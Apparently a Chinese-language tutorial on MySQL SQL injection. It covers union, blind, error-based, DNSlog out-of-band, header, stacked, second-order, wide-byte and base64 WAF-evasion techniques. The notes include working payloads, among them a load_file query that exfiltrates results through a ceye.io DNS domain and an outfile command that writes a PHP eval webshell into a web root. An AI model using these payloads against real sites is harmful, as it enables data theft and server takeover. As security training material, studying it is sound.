### SQL注入

#### 一、SQL注入漏洞

##### 	1、产生原因

​			SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句插入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。

##### 	2、危害

​			SQL注入漏洞可能会造成服务器数据库信息泄露、数据窃取、网页被篡改，甚至可能会造成网站被挂码、服务器被远程控制、被安装后门等。

##### 	3、分类

​			按照数据类型分为：数字型注入和字符型注入

​			按照服务器返回信息是否显示分为：报错注入和盲注

#### 二、mysql注入

##### 	1、数据库的结构

​			数据库、数据表、列、行、值、表头、键		

##### 	2、mysql数据库

​			在mysql5.0版本后，mysql中默认有information_schema这个数据库，在该库中有三张重要的表：

​				schemata(存放数据库所有的库名)，schema_name

​				tables(存放数据库所有的表名)，table_schema、table_name

​				columns(存放数据库所有的列名)，table_schema、table_name、column_name

#### 三、SQL注入探测方法

##### 	1、sql注入漏洞攻击流程

​			----注入点探测：使用web漏扫工具找注入点、手工构造语句找注入点

​			----信息获取：构造语句获取数据库的相关重要信息

​			----获取权限：获取操作系统权限，通过数据库执行shell，上传木马

##### 	2、探测方法

​			一般来说，SQL注入一般存在于形如：http://xxx.xxx.xxx/abc.asp?id=XX等带有参数的ASP动态网页中。总之只要是带有参数的动态网页并且该网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大。

#### 四、注入方式汇总

##### 	1、union联合注入

​		1>条件：联合查询两边字段数一样

​		2>步骤：（1）探测是否存在sql注入和注入类型

​						（2）order by 猜字段数

​						（3）探测显示位

​						（4）在显示位构造子查询

##### 	2、boolean盲注

​		1>概述：Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的，以此来获取数据库中的数据。

​						Boolean是基于真假的判断; 不管输入什么，结果都只返回真或假两种情况。

​						Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。

​		2>判断方法：通过长度判断length():length(database())>=x 

​								通过字符判断substr():substr(database(),1,1) =‘s’ 

​								通过ascII码判断:ascii():ascii(substr(database(),1,1)) =x

##### 	3、时间盲注

​		1>概述：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面的内容来判断。这里我们可以通过构造语句，通过页面响应的时长，来判断信息，这既是时间盲注。

​		2>原理：利用sleep()或benchmark()等函数让mysql执行时间变长，经常与 if(expr1,expr2, expr3）语句结合使用，通过页面的响应时间来判断条件是否正确。

​		3>常用函数：left(m,n) --从左向右截取字符串m返回其前n位 

​								substr(m,1,1) --取字符串m的左边第一位起，1字长的字符串 

​								ascii(m) --返回字符m的ASCII码  

​								if(str1,str2,str3)--如果str1正确就执行str2，否则执行str3 

​								sleep(m)--使程序暂停m秒 

​								length(m) --返回字符串m的长度 

​								count(column_name) --返回指定列的值的数目

##### 	4、DNS Log注入

​		1>概述：DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道。

​		2>注入原理：

​				(1) 攻击者先向web服务器提交payload语句，比如：select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))

​				(2) 其中的攻击语句被放到数据库中会被执行，生成的结果与后面的.XXX.ceye.io\\abc构成一个新的域名

​				(3) 这时load_file()就可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析

​				(4) 此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果，实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的DNS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。

​		3>DNSlog平台：http://ceye.io

​	 								http://www.dnslog.cn/

​		4>使用场景：

​				sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击。一共是这四个场景：SQL盲注、命令执行（无回显）、XSS（无回显）、SSRF(无回显)。

​		5>使用条件：load_file()函数可以使用。

​					show variables like '%secure%';   查看mysql是否有读写文件权限；

​					当secure_file_priv为空，就可以读取磁盘的目录。

​					当secure_file_priv为G:\，就可以读取G盘的文件。

​					当secure_file_priv为null，load_file就不能加载文件。

​		6>注意事项：

​					l dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个'\\\'，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。

​					l 在进行注入的时候，需要先使用测试代码判断该位置是否存在注入，然后再在后面拼接代码，因为对照pyload进行输入的话，可能会出现dnslog网站接收不到的情况。

​					l 在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。

##### 	5、报错注入

​		1>概述：在MYSQL中使用一些指定的函数来制造报错，后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端，从而从报错信息中获取设定的信息。select/insert/update/delet e都可以使用报错来获取信息。

​		2>常见报错函数：updatexml()，extractvalue()，floor() ,exp()

​				updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数；

​				extractvalue()函数也是MYSQL对XML文档数据进行查询的XPATH函数； 

​		3>原理：只要路径错误就会出现报错信息

​		4>extractvalue()使用示例：

​								`union select 1,extractvalue(1,concat(1,(select database()))),3-- +` 

​								`and 1=extractvalue(1,concat(0x7e,(select database())))-- +`

​		5>updatexml()使用示例：

​								 `and 1=updatexml("1",concat(0x7e,(select database())),"3")`

​		6>floor()使用示例：

​								 `union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as x from information_schema.tables group by x-`

##### 	6、mysql post注入

​		1>post union注入：使用burpsuite抓包，确定post提交参数

​											使用hack bar进行注入点探测

​											union 联合查询注入

​		2>post 报错注入：同上

​		3>post 盲注：boolean盲注、时间盲注、DNSlog注入

##### 	7、post报头注入

​		1>概述：Post注入时，万能密码admin’ or 1=1无法绕过验证，用户名无法注入。此时可以根据是否有HTTP头相关信息显示，并尝试POST报头注入。

​		2>注入字段：user-agent、referer、cookie、

##### 	8、Mysql注入文件上传

​		1>概述：webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理、权限管理等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。

​						webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，.NET脚本木马、JSP脚本木马python脚本木马等。

​		2>mysql写入webshell必备条件：

​			① 数据库的当前用户为ROOT或拥有FILE权限；

​			② 知道网站目录的绝对路径；

​			③ PHP的GPC参数为off状态；

​			④ MySQL中的secure_file_priv参数不能为NULL状态。

​		3>mysql写入webshell方法：

​			使用outfile方法

​			基于log日志写入

​		4>使用outfile上传webshell示例：

​			 union select 1,2,"<?php @eval($_POST['password']);?>" into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\a.php" --+

​			然后使用webshell工具连接木马：

​			webshell连接工具：蚁剑(AntSword) 、中国菜刀*(Chopper)* 、C刀(Cknife)、冰蝎(Behinder)、Xise XISE WebShell管理工具、Altman、Weevely、QuasiBot、Webshell-Sniper、WebshellManager等。

​		5>基于log日志写入webshell

​			基于log日志写入的方法其实是先将日志文件的导出目录修改成Web目录，然后执行了一次简单的WebShell代码查询功能，此时日志文件记录了此过程，这样再Web目录下的日志文件就变成了WebShell

​			操作方法：

​				先设置日志文件的导出目录：set global general_file = ‘Web目录’；然后执行一遍select “WebShell代码”。

​				然后使用中国菜刀等工具就可以连接到web服务器了。				

##### 	9、堆叠注入

​		1>概述：Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做堆叠注入。

​		2>使用条件有限：堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当数据库系统支持执行多条sql语句时才能够使用。

​		3>堆叠注入和union的区别：union后只能跟select，而堆叠后面可以使用insert，update， create，delete等常规数据库语句。

​		4>使用示例：

​			`http://127.0.0.1/web/sql/duidie.php?id=1;update test.users set username='lili' where id=100;`

##### 	10、二次注入

​		1>概述：二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

​		2>注入思路：

​			第一步：插入恶意数据。进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

​			第二步：引用恶意数据。开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

##### 11、宽字节注入

​		1>产生背景：开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。addslashes等函数默认对单引号等特殊字符加上反斜杠“\”进行转义，这样就可以避免注入。

​		2>产生原因：Mysql在使用GBK编码的时候，如果第一个字符的ASCII码大于128，会认为前两个字符是一个汉字，会将后面的转义字符\“吃掉”，将前两个字符拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。

​		3>常用过滤函数：

​			Addslashes()函数：对get、post、cookie等传递的参数中的”’”、\、null等进行转义

​			Mysql_real_escape_string()函数：转义如\x00、\n、\r、\、’、”、\x1a等

​			mysql_escape_string函数：注意，php5.3中已经不使用。

​		4>编码：

​			acsii码是单字节编码，即一个字符一个字节，范围为0~127，代表128个字符

​			gbk2312兼容 ascii:每个汉字占两个字节，为了与ascii兼容，最高位不能为0。

​			gbk汉字的字节范围：第一字节：0x81~0 xFE 即129~255

​									  			第二字节：0x40~0xFE   即64~255

​			gbk兼容gbk2312:如果第一个字节大于128，第二个字节大于64即可组成一个汉字编码。

​												遇到连续两个字节，都符合gbk取值范围，会自动解析为一个汉字。

##### 	12、base64注入

​		1>注入原理：base64注入是针对传递的参数被base64编码后的注入点进行注入。这种方式常用来绕过一些WAF的检测。如果有WAF，则WAF会对传输中的参数ID进行检查，但由于传输中的ID经过base64编码，所以此时WAF很有可能检测不到危险代码，进而绕过了WAF检测。

​		2>注入点判断：

​			对参数进行base64编码来判断是否存在SQL注入漏洞。

​			如参数为：id=1，id=1’，id=1 and 1=1，id=1 and 1=2

​			编码后为：id=MQ==，id=MSc=，id=MSBhbmQgMT0x，id=MSBhbmQgMT0y

​		3>使用示例：

​			参数id=1 ，将1经过base64编码访问：http://127.0.0.1/web/sql/base64.php?id=MQ==

​			ID参数经过base64编码,解码后发现ID为1，尝试加上一个单引号并一起转成base64编码。

​	http://127.0.0.1/web/sql/base64.php?id=MSc=  报错（1’的base64的编码为[MSc](http://172.16.1.3/a/base64.php?id=MSc)=）

​	http://127.0.0.1/web/sql/base64.php?id=MSBhbmQgMT0x (1 and 1=1)返回和1结果相同

​	http://127.0.0.1/web/sql/base64.php?id=MSBhbmQgMT0y (1 and 1=2)返回异常`

#### 五、sql注入的WAF绕过

